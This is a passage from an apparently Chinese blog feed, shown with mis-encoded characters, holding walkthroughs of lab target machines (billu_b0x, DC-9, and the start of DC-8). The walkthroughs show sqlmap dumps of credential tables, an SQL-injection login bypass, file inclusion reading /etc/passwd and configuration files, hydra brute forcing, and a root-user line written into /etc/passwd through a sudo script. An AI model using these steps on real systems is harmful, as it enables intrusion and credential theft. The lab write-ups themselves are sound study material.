<p><code>head.php</code> è²Œä¼¼æ²¡å•¥ä¸œè¥¿ å°±ä¸€èƒŒæ™¯å›¾</p>
<p><img src="/posts/827ecdf7/head.png"></p>
<p><code>test.php</code> æ–‡ä»¶åŒ…å«</p>
<p><img src="/posts/827ecdf7/test.png"></p>
<p><code>phpmy</code>        phpmyadminç™»å½•é¡µé¢</p>
<p><img src="/posts/827ecdf7/phpmy.png"></p>
<p><code>in</code>            phpinfo()</p>
<p><img src="/posts/827ecdf7/phpinfo.png"></p>
<blockquote>
<p>allow_url_fopen    On<br>allow_url_include    Off<br>mysqlç‰ˆæœ¬ä¸º5.5.38</p>
</blockquote>
<h4 id="ç”¨dirbæ‰«æç›®å½•"><a href="#ç”¨dirbæ‰«æç›®å½•" class="headerlink" title="ç”¨dirbæ‰«æç›®å½•"></a>ç”¨dirbæ‰«æç›®å½•</h4><blockquote>
<p> â€”- Scanning URL: <a href="http://192.168.18.144/">http://192.168.18.144/</a> â€”-</p>
<ul>
<li><a href="http://192.168.18.144/add">http://192.168.18.144/add</a> (CODE:200|SIZE:307)                                                          </li>
<li><a href="http://192.168.18.144/c">http://192.168.18.144/c</a> (CODE:200|SIZE:1)                                                              </li>
<li><a href="http://192.168.18.144/cgi-bin/">http://192.168.18.144/cgi-bin/</a> (CODE:403|SIZE:290)                                                     </li>
<li><a href="http://192.168.18.144/head">http://192.168.18.144/head</a> (CODE:200|SIZE:2793)<br>==&gt; DIRECTORY: <a href="http://192.168.18.144/images/">http://192.168.18.144/images/</a>                                                             </li>
<li><a href="http://192.168.18.144/in">http://192.168.18.144/in</a> (CODE:200|SIZE:47554)                                                         </li>
<li><a href="http://192.168.18.144/index">http://192.168.18.144/index</a> (CODE:200|SIZE:3267)                                                       </li>
<li><a href="http://192.168.18.144/index.php">http://192.168.18.144/index.php</a> (CODE:200|SIZE:3267)                                                   </li>
<li><a href="http://192.168.18.144/panel">http://192.168.18.144/panel</a> (CODE:302|SIZE:2469)                                                       </li>
<li><a href="http://192.168.18.144/server-status">http://192.168.18.144/server-status</a> (CODE:403|SIZE:295)                                                </li>
<li><a href="http://192.168.18.144/show">http://192.168.18.144/show</a> (CODE:200|SIZE:1)                                                           </li>
<li><a href="http://192.168.18.144/test">http://192.168.18.144/test</a> (CODE:200|SIZE:72)                                                          </li>
</ul>
</blockquote>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>è¿›å…¥ä¸»é¡µï¼Œæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶æç¤ºsqlæ³¨å…¥</p>
<p><img src="/posts/827ecdf7/index.png"></p>
<p>å°è¯•ä¸‹sqlæ³¨å…¥ï¼Œç”¨sqlmapè·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u &#39;http://192.168.18.144/&#39;  --method POST --data &#39;un=admin&amp;os=admin&amp;login=let%27s+login&#39; --batch --dbms mysql </code></p>
<p>æ²¡æ‰«å‡ºæ¥æ³¨å…¥ç‚¹</p>
<br>

<h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><p>ä¼ ä¸€ä¸ªå›¾ç‰‡é©¬è¯•è¯•ï¼Œæˆ–è®¸åé¢ä¼šç”¨åˆ°</p>
<br>

<h4 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h4><p>åœ¨<code>test.php</code>getè¯·æ±‚ ä¼ å‚ <code>?file=/etc/passwd</code>æ²¡ååº”</p>
<p>ä½¿ç”¨postä¼ å‚<code>file=/etc/passwd</code>ä¼šå¼¹å‡ºä¸€ä¸ªä¸‹è½½æ–‡ä»¶çª—å£</p>
<p>æ–‡ä»¶å†…å®¹ä¸º<code>/etc/passwd</code>çš„è¾“å‡ºå†…å®¹</p>
<p>ä½¿ç”¨burpæŠ“åŒ…ï¼ŒæŠŠgetåŒ…æ”¹ä¸ºpoståŒ…</p>
<p><img src="/posts/827ecdf7/file_include1.png"></p>
<blockquote>
<p>ica:x:1000:1000:ica,,,:/home/ica:/bin/bash</p>
</blockquote>
<p>å‘ç°ä¸€ä¸ª<code>ica</code>çš„ç”¨æˆ·ï¼Œå¯ä»¥ç™»å½•ssh</p>
<br>


<p>åŒæ—¶ç”¨è¿™ç§æ–¹æ³•å»ä¸‹è½½<code>add.php</code>,<code>in.php</code> <code>index.php</code> <code>test.php</code> <code>show.php</code> <code>c.php</code></p>
<p><img src="/posts/827ecdf7/addphp.png"><br>åœ¨add.phpä¸­æœ‰æ–‡ä»¶ä¸Šä¼ çš„ä»£ç ï¼Œæ²¡æœ‰ç»è¿‡ä»»ä½•å¤„ç†ï¼Œå¯ä»¥è€ƒè™‘å»ä¸Šä¼ å›¾ç‰‡é©¬åœ¨in.phpä¸­æ˜¯phpinfoä¿¡æ¯</p>
<h4 id="åå°ç™»å½•"><a href="#åå°ç™»å½•" class="headerlink" title="åå°ç™»å½•"></a>åå°ç™»å½•</h4><h5 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h5><p><img src="/posts/827ecdf7/cphp.png"><br>åœ¨c.phpä¸­å‘ç°äº†mysqlæ•°æ®åº“çš„è´¦æˆ·ä¿¡æ¯<code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code></p>
<blockquote>
<p>ç”¨æˆ·å billuå¯†ç  b0x_billuæ•°æ®åº“å ica_lab</p>
</blockquote>
<p>ä½¿ç”¨è¿™ä¸ªè´¦æˆ·å»å°è¯•ç™»å½•phpmyadminï¼ŒæˆåŠŸç™»å½•,å¹¶å¾—åˆ°phpmyadminç‰ˆæœ¬ä¸º3.4.7ç™»å½•åå°æ€è·¯ä¸€ ä½¿ç”¨phpmyadminä¸­è´¦å·<br><img src="/posts/827ecdf7/auth.png"><br>åœ¨anthè¡¨ä¸­å¾—åˆ°ä¸€ä¸ªè´¦æˆ· biLLu hEx_itä½¿ç”¨æ­¤è´¦æˆ·æˆåŠŸç™»å½•åˆ°åå°</p>
<h5 id="æ€è·¯äºŒ-SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index-phpçš„æºç "><a href="#æ€è·¯äºŒ-SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index-phpçš„æºç " class="headerlink" title="æ€è·¯äºŒ SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index.phpçš„æºç "></a>æ€è·¯äºŒ SQLæ³¨å…¥å†å°è¯•æŸ¥çœ‹index.phpçš„æºç </h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>å‰é¢ä½¿ç”¨str_replace å°†å•å¼•å·å…¨éƒ¨è¿‡æ»¤æ‰äº†ï¼Œ<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>è¾“å…¥<code>pass=admin\   uname= or 1=1 --+</code><br>å³ <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>æˆåŠŸç™»å½•æ–‡ä»¶ä¸Šä¼ <br><img src="/posts/827ecdf7/login.png"><br>å®¡è®¡ä¸€ä¸‹panel.php<br>é¡µé¢æœ‰ä¸¤ä¸ªåŠŸèƒ½ show users å’Œ add users å¯¹äºæ–‡ä»¶ä¸Šä¼ ä½¿ç”¨äº†ç™½åå•æœºåˆ¶ï¼Œåªå…è®¸ä¸Šä¼ <code>jpeg,jpg,gif,png</code><br>å½“è¦ä¸Šä¼ ä¸€å¼ å›¾ç‰‡æ˜¯ï¼Œä¼šå…ˆåˆ¤æ–­åç¼€åæ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®ï¼Œè¿˜æœ‰ä¸€ä¸ªmimeéªŒè¯<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>å¯ä»¥çœ‹åˆ°ä¸Šä¼ å›¾ç‰‡çš„è·¯å¾„ä¸ºuploaded_images/</p>
<p>è¿™é‡Œä¼ é©¬å¤šæ¬¡éƒ½æ²¡ä¼ æˆåŠŸï¼Œæœ‰æ—¶é—´å†è¯•è¯•å§â€¦.</p>
<h4 id="å¾—åˆ°rootæƒé™æ€è·¯äºŒ"><a href="#å¾—åˆ°rootæƒé™æ€è·¯äºŒ" class="headerlink" title="å¾—åˆ°rootæƒé™æ€è·¯äºŒ"></a>å¾—åˆ°rootæƒé™æ€è·¯äºŒ</h4><p>phpmyadminçš„é…ç½®æ–‡ä»¶ä¸º<code>config.inc.php</code> ä½¿ç”¨ä»»æ„æ–‡ä»¶ä¸‹è½½å»ä¸‹è½½æ”¹é…ç½®æ–‡ä»¶<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>å¾—åˆ°ä¸€ä¸ªrootè´¦æˆ·root roottoorä½¿ç”¨sshç™»å½• ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x34;&#52;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#49;&#56;&#x2e;&#x31;&#x34;&#52;</a>æˆåŠŸç™»å½•rootç”¨æˆ·</p>
<p>Reference</p>
<blockquote>
<p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>vulhub</category>
      </categories>
      <tags>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges9</title>
    <url>/posts/73305909/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ     192.168.18.0/24</p>
<p>kali    192.168.18.131</p>
<p>é¶æœº    192.168.18.142</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00039s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.00043s latency).<br>MAC Address: 00:0C:29:C2:75:62 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00018s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœºç«¯å£"><a href="#æ‰«æé¶æœºç«¯å£" class="headerlink" title="æ‰«æé¶æœºç«¯å£"></a>æ‰«æé¶æœºç«¯å£</h4><blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.142 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-10 20:35 CST<br>Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan<br>NSE Timing: About 93.02% done; ETC: 20:36 (0:00:00 remaining)<br>Nmap scan report for 192.168.18.142<br>Host is up (0.0014s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE    SERVICE VERSION<br>22/tcp filtered ssh<br>80/tcp open     http    Apache httpd 2.4.38 ((Debian))<br>MAC Address: 00:0C:29:C2:75:62 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>å‘ç°ä¸€ä¸ªæœç´¢æ¡†å’Œç™»å½•æ¡†ï¼Œçœ‹ä¸‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot; --dbs --batch</code></p>
<p>å¾—åˆ°ä¸‰ä¸ªæ•°æ®åº“</p>
<blockquote>
<p>available databases [3]:<br>[*] information_schema<br>[*] Staff<br>[*] users</p>
</blockquote>
<p><code> sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users --tables</code></p>
<blockquote>
<p>Database: users<br>[1 table]<br>+â€”â€”â€”â€”-+<br>| UserDetails |<br>+â€”â€”â€”â€”-+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails --columns</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[6 columns]<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+<br>| Column    | Type            |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+<br>| firstname | varchar(30)     |<br>| id        | int(6) unsigned |<br>| lastname  | varchar(30)     |<br>| password  | varchar(20)     |<br>| reg_date  | timestamp       |<br>| username  | varchar(30)     |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code>ç»“æœå‘ç°è¿™æ˜¯displayé¡µé¢çš„ä¿¡æ¯æ¢å¦ä¸€ä¸ªè¡¨è·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff --tables</code></p>
<blockquote>
<p>Database: Staff<br>[2 tables]<br>+â€”â€”â€”â€”â€“+<br>| StaffDetails |<br>| Users        |<br>+â€”â€”â€”â€”â€“+</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users --column</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[3 columns]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€“+<br>| Column   | Type            |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€“+<br>| Password | varchar(255)    |<br>| UserID   | int(6) unsigned |<br>| Username | varchar(255)    |</p>
</blockquote>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D Staff -T Users -C Username,Password  --dump</code></p>
<blockquote>
<p>Database: Staff<br>Table: Users<br>[1 entry]<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>| Username | Password                         |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+</p>
</blockquote>
<p>è·‘å‡º<code>admin</code> <code>856f5de590ef37314e7c3bdf6f8a66dc</code></p>
<p>md5è§£å‡ºæ¥<code>transorbital1</code></p>
<p>è·‘å‡ºå¦ä¸€ä¸ªæ•°æ®åº“çš„æ•°æ®</p>
<p><code>sqlmap -u &quot;http://192.168.18.142/results.php&quot;  --method POST --data &quot;search=a123&quot;  --batch -D users -T UserDetails -C username,password --dump</code></p>
<blockquote>
<p>Database: users<br>Table: UserDetails<br>[17 entries]<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+<br>| username  | password      |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+<br>| marym     | 3kfs86sfd     |<br>| julied    | 468sfdfsd2    |<br>| fredf     | 4sfd87sfd1    |<br>| barneyr   | RocksOff      |<br>| tomc      | TC&amp;TheBoyz    |<br>| jerrym    | B8m#48sd      |<br>| wilmaf    | Pebbles       |<br>| bettyr    | BamBam01      |<br>| chandlerb | UrAG0D!       |<br>| joeyt     | Passw0rd      |<br>| rachelg   | yN72#dsd      |<br>| rossg     | ILoveRachel   |<br>| monicag   | 3248dsds7s    |<br>| phoebeb   | smellycats    |<br>| scoots    | YR3BVxxxw87   |<br>| janitor   | Ilovepeepee   |<br>| janitor2  | Hawaii-Five-0 |<br>+â€”â€”â€”â€“+â€”â€”â€”â€”â€”+</p>
</blockquote>
<p>å»<code>manage.php</code>ç™»å½•ä¸‹è¯•è¯•,æˆåŠŸç™»å½•</p>
<p>é¡µé¢å·¦ä¸‹è§’æœ‰ä¸€ä¸ª<code> File does not exist</code>æ¨æµ‹æœ‰æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="/posts/73305909/file_include_etcpasswd.png"></p>
<p><img src="/posts/73305909/Wappalyzer.png"></p>
<p>ä½¿ç”¨çš„apache</p>
<p><img src="/posts/73305909/apache.png"></p>
<p>ç”¨burp çˆ†ç ´äº†ä¸‹LFIå­—å…¸ æ²¡å‘ç°æœ‰ç”¨çš„ä¿¡æ¯</p>
<p><img src="/posts/73305909/intruder.png"></p>
<p>å»è¯•è¯•ä¹‹å‰è·‘å‡ºæ¥çš„ç”¨æˆ·è´¦å·èƒ½ä¸èƒ½sshç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># username</span><br><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#passwd</span><br><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/ssh_connect_error.png"></p>
<p>å‘ç°å…¨æ˜¯è¿æ¥å¤±è´¥ï¼Œä½†æ˜¯nmapæ‰«æç«¯å£çš„æ—¶å€™22ç«¯å£æ˜¯å¼€æ”¾çš„</p>
<p>ç½‘ä¸Šæœäº†ä¸‹ï¼Œè¿™æ˜¯ä½¿ç”¨çš„<strong>knockæœåŠ¡(ç«¯å£æ•²é—¨æœåŠ¡)</strong> </p>
<h3 id="knockæœåŠ¡"><a href="#knockæœåŠ¡" class="headerlink" title="knockæœåŠ¡"></a>knockæœåŠ¡</h3><p>Knockdçš„é…ç½®æ–‡ä»¶è·¯å¾„ä¸º<code>/etc/knockd.conf</code></p>
<p><img src="/posts/73305909/knockd_conf.png"></p>
<p>å¼€æ”¾äº†<code>7469</code>,<code>8475</code>,<code>9842</code>ä¸‰ä¸ªç«¯å£</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ22ç«¯å£æ˜¯å…³é—­çš„ï¼Œåªæœ‰è®¿é—®äº†ä»¥ä¸Šä¸‰ä¸ªç«¯å£åï¼Œ22ç«¯å£æ‰ä¼šå¼€æ”¾ã€‚</p>
<p>ä½¿ç”¨nmapè®¿é—®ä»¥ä¸Šä¸‰ä¸ªç«¯å£</p>
<p>è®¿é—®ååœ¨å»è¿æ¥sshï¼Œsshç«¯å£å¯ä»¥è®¿é—®</p>
<p><img src="/posts/73305909/ssh_connect.png"></p>
<p><img src="/posts/73305909/hydra1.png"></p>
<p>æœ€åè¯•å‡ºäº†ä¸‰ç»„å¯ä»¥sshç™»å½•çš„è´¦å·</p>
<blockquote>
<p>chandlerb   UrAG0D!<br>joeyt       Passw0rd<br>janitor     Ilovepeepee</p>
</blockquote>
<p><img src="/posts/73305909/ssh1.png"></p>
<p>åœ¨<code>janitor</code>ç”¨æˆ·ä¸‹å‘ç°ä¸€ä¸ªéšè—æ–‡ä»¶å¤¹ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªå¯†ç æœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># passwords-found-on-post-it-notes.txt </span><br><span class="line"></span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<p><img src="/posts/73305909/hydra2.png"></p>
<p>è·‘å‡ºäº†ä¸€ä¸ªè´¦å·</p>
<p><code>fredf</code> <code>B4-Tru3-001</code></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p><img src="/posts/73305909/fredf_sudo.png"></p>
<p>ä¸éœ€è¦å¯†ç å¯ä»¥æ‰§è¡Œ<code>/opt/devstuff/dist/test/test</code></p>
<p><img src="/posts/73305909/testpy.png"></p>
<p>æç¤ºtestæ˜¯ä¸ªpyæ–‡ä»¶</p>
<p>æ‰¾ä¸€ä¸‹test.py</p>
<p><code>find / -name &quot;test.py&quot; 2&gt;/dev/null</code></p>
<p><img src="/posts/73305909/find_test.png"></p>
<p>å‘ç°ä¸¤ä¸ªæ–‡ä»¶</p>
<blockquote>
<p>/opt/devstuff/test.py<br>/usr/lib/python3/dist-packages/setuptools/command/test.py</p>
</blockquote>
<p>ä¼°è®¡åªæœ‰ç¬¬ä¸€ä¸ªå¯ä»¥ç”¨å¾—ä¸Š</p>
<p><code>cat /opt/devstuff/test.py</code></p>
<p><img src="/posts/73305909/testpy1.png"></p>
<p>éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼ŒæŠŠç¬¬ä¸€ä¸ªå‚æ•°çš„å†…å®¹è¿½åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶ä¸­</p>
<p>ä½¿ç”¨opensslåˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<p><code> openssl  passwd -1 -salt Mamor 123456</code><br><code>$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/</code></p>
<p>æ„é€ ä¸€ä¸ªç”¨æˆ·</p>
<p><code>Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash</code></p>
<p>echo â€œMamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bashâ€ &gt; /tmp/mamor</p>
<p>sudo ./test /tmp/mamor /etc/passswd</p>
<p>æ„é€ å¤±è´¥æ²¡æ³•å†™å…¥</p>
<p><code>cat  /tmp/mamor </code></p>
<p><img src="/posts/73305909/usercreate_error.png"></p>
<p>å‘ç°å†™å…¥çš„æ•°æ®å¹¶ä¸æ˜¯åŸæ•°æ®</p>
<p>æ¢<code>&#39;</code>è¯•è¯•</p>
<p><code>echo &#39;Mamor:$1$Mamor$y58eSo9.PqQRr.NOp4Ltp/:0:0::/root:/bin/bash&#39; &gt; /tmp/mamor1</code></p>
<p><img src="/posts/73305909/usercreate.png"></p>
<p>è¿˜æ˜¯æ²¡æ³•å†™å…¥</p>
<p><code>openssl passwd -1 -salt test test</code></p>
<blockquote>
<p>$1$test$pi/xDtU5WFVRqYS6BMU8X/</p>
</blockquote>
<p><code>echo &#39;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash&#39; &gt;&gt; /tmp/testtest</code></p>
<p><code>sudo ./test /tmp/testtest /etc/passwd</code></p>
<p><code>cat /etc/passwd</code></p>
<blockquote>
<p>test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0::/root:/bin/bash</p>
</blockquote>
<p>è¿™æ¬¡å†™å…¥æˆåŠŸ</p>
<p><img src="/posts/73305909/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges8</title>
    <url>/posts/437699f/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><blockquote>
<p>ç½‘æ®µ     192.168.18.0/24</p>
<p>kali        192.168.18.131</p>
<p>é¶æœº        192.168.18.141</p>
</blockquote>
<h4 id="æ‰«æç½‘æ®µ"><a href="#æ‰«æç½‘æ®µ" class="headerlink" title="æ‰«æç½‘æ®µ"></a>æ‰«æç½‘æ®µ</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
</blockquote>
<h4 id="æ‰«æé¶æœº"><a href="#æ‰«æé¶æœº" class="headerlink" title="æ‰«æé¶æœº"></a>æ‰«æé¶æœº</h4><blockquote>
<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
</blockquote>
<h4 id="dirsearchæ‰«ç›®å½•"><a href="#dirsearchæ‰«ç›®å½•" class="headerlink" title="dirsearchæ‰«ç›®å½•"></a>dirsearchæ‰«ç›®å½•</h4><blockquote>
<p>sudo python3 dirsearch -u 192.168.18.141</p>
</blockquote>
<p>æ²¡æ‰«åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œæ¢dirbæ‰«åˆ°äº†</p>
<p><code>http://192.168.18.141/user</code></p>
<h3 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h3><p>è¿›å…¥ä¸»é¡µ,ç‚¹å·¦ä¾§çš„Detailsä¸‹çš„é“¾æ¥ï¼Œå‘ç°urlå¤„æœ‰ä¸ªnidçš„å‚æ•°ï¼Œçœ‹çœ‹è¿™é‡Œæ˜¯å¦å­˜åœ¨sqlæ³¨å…¥</p>
<p>sqlmapè·‘ä¸€ä¸‹</p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
<p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
<blockquote>
<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
</blockquote>
